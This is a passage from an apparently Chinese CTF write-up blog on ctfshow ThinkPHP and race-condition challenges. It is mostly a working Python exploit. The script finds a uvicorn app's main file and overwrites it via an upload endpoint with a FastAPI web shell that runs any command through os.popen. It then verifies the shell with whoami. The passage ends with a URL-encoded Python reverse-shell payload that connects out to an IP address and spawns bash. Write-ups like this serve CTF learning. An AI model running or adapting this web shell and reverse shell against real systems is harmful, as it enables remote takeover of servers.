</span></span><span class=line><span class=cl>                              <span class=n>content</span><span class=p>[</span><span class=s1>&#39;fileContent&#39;</span><span class=p>]</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s2>&#34;uvicorn&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=mi>7</span><span class=p>:</span><span class=n>content</span><span class=p>[</span><span class=s1>&#39;fileContent&#39;</span><span class=p>]</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>)]</span> <span class=o>+</span> <span class=s2>&#34;.py&#34;</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[√] 检测到主程序，</span><span class=si>{</span><span class=n>python_file</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>global</span> <span class=n>app</span>
</span></span><span class=line><span class=cl>                <span class=n>app</span> <span class=o>=</span> <span class=n>content</span><span class=p>[</span><span class=s1>&#39;fileContent&#39;</span><span class=p>][</span>
</span></span><span class=line><span class=cl>                      <span class=n>content</span><span class=p>[</span><span class=s1>&#39;fileContent&#39;</span><span class=p>]</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s2>&#34;uvicorn&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=mi>7</span> <span class=o>+</span> <span class=nb>len</span><span class=p>(</span><span class=n>python_file</span><span class=p>)</span> <span class=o>-</span> <span class=mi>3</span> <span class=o>+</span> <span class=mi>1</span><span class=p>:</span><span class=n>content</span><span class=p>[</span><span class=s1>&#39;fileContent&#39;</span><span class=p>]</span><span class=o>.</span><span class=n>find</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                          <span class=s2>&#34;--&#34;</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[√] 检测到uvicorn的应用名，</span><span class=si>{</span><span class=n>app</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[x] 检测到无reload参数，无法热部署，程序结束&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>python_file</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>new_file</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>app</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=sa>f</span><span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>import uvicorn,os
</span></span></span><span class=line><span class=cl><span class=s1>from fastapi import *
</span></span></span><span class=line><span class=cl><span class=s1></span><span class=si>{</span><span class=n>app</span><span class=si>}</span><span class=s1> = FastAPI()
</span></span></span><span class=line><span class=cl><span class=s1> 
</span></span></span><span class=line><span class=cl><span class=s1>@</span><span class=si>{</span><span class=n>app</span><span class=si>}</span><span class=s1>.get(&#34;/s&#34;)
</span></span></span><span class=line><span class=cl><span class=s1>def s(c):
</span></span></span><span class=line><span class=cl><span class=s1>  os.popen(c)
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_shell</span><span class=p>(</span><span class=n>name</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>name</span> <span class=o>=</span> <span class=n>name</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>url</span><span class=o>=</span><span class=n>url</span> <span class=o>+</span> <span class=s2>&#34;upload/&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>files</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;file&#34;</span><span class=p>:</span> <span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>new_file</span><span class=p>())}</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s1>&#39;fileName&#39;</span> <span class=ow>in</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[√] 上传成功，等待5秒重载主程序 &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>5</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[√] &#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=mi>5</span> <span class=o>-</span> <span class=n>i</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34; 秒后验证重载&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[x] 主程序重写失败，程序退出&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span> <span class=o>+</span> <span class=s1>&#39;s/?c=whoami&#39;</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[x] 主程序重载失败，程序退出&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>response</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[√] 恭喜，getshell成功 路径为</span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>s/ &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[x] 主程序重载失败，程序退出&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>upload</span><span class=p>(</span><span class=n>name</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>f</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>BytesIO</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mi>100</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>url</span><span class=o>=</span><span class=n>url</span> <span class=o>+</span> <span class=s2>&#34;upload/&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>files</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;file&#34;</span><span class=p>:</span> <span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>f</span><span class=p>)}</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s1>&#39;fileName&#39;</span> <span class=ow>in</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>data</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>{</span><span class=s1>&#39;fileName&#39;</span><span class=p>:</span> <span class=s1>&#39;&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>download</span><span class=p>(</span><span class=n>file</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span> <span class=o>+</span> <span class=s2>&#34;uploads/&#34;</span> <span class=o>+</span> <span class=n>file</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s1>&#39;fileName&#39;</span> <span class=ow>in</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>data</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>{</span><span class=s1>&#39;fileName&#39;</span><span class=p>:</span> <span class=s1>&#39;&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[√] 开始读取openapi.json&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>apijson</span> <span class=o>=</span> <span class=n>get_api</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[√] 开放api有&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=o>*</span><span class=n>apijson</span><span class=p>[</span><span class=s1>&#39;paths&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[√] 开始读取运行目录&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pwd</span> <span class=o>=</span> <span class=n>get_pwd</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>pwd</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[√] 运行目录读取成功 路径为</span><span class=si>{</span><span class=n>pwd</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[x] 运行路径读取失败，程序退出&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>python_file</span> <span class=o>=</span> <span class=n>get_python_file</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>python_file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[√] uvicorn主文件读取成功 路径为</span><span class=si>{</span><span class=n>pwd</span><span class=si>}{</span><span class=n>python_file</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[x] uvicorn主文件读取失败，程序退出&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>get_shell</span><span class=p>(</span><span class=n>pwd</span> <span class=o>+</span> <span class=n>python_file</span><span class=p>)</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>然后反弹shell即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?c=python%20-c%20%22import%20os%2Csocket%2Csubprocess%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((&#39;156.238.233.9&#39;%2C9999))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B&#39;%2Fbin%2Fbash&#39;%2C&#39;-i&#39;%5D)%3B%22
</span></span></code></pre></td></tr></table></div></div><p>返回为NULL就拿到shell了，就在当前目录</p></section><footer class=article-footer><section class=article-tags><a href=/tags/racecondition/>RaceCondition</a>
<a href=/tags/thinkphp/>Thinkphp</a></section><section class=article-reward style="margin:var(--card-padding)0 0;display:block;text-transform:none;text-align:center"><h3 style="margin:0 0 .75rem;font-size:1.1rem">赞赏支持</h3><figure style="margin:0 auto"><img src=/wechat.png alt loading=lazy style="width:min(260px,90vw);height:auto;border:1px solid #eee;border-radius:12px;background:#fff;padding:6px;box-shadow:0 2px 8px rgba(0,0,0,4%)"><figcaption style=font-size:.9rem;color:#666;margin-top:.5rem></figcaption></figure></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/ctfshow-extreme-challenge-3-byte-file-read/><div class=article-details><h2 class=article-title>Ctfshow极限大挑战之三字节读取文件</h2></div></a></article><article><a href=/p/ctfshow-thinkphp-sequel-2/><div class=article-details><h2 class=article-title>ctfshowthinkphp(续集二)</h2></div></a></article><article><a href=/p/ctfshow-thinkphp-special-sequel-1/><div class=article-details><h2 class=article-title>ctfshow的thinkphp专题(续集一)</h2></div></a></article><article><a href=/p/ctfshow-watermelon-cup/><div class=article-details><h2 class=article-title>ctfshow西瓜杯</h2></div></a></article><article><a href=/p/ctfshow-f5-cup/><div class=article-details><h2 class=article-title>ctfshowF5杯</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
2024 -
2025 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>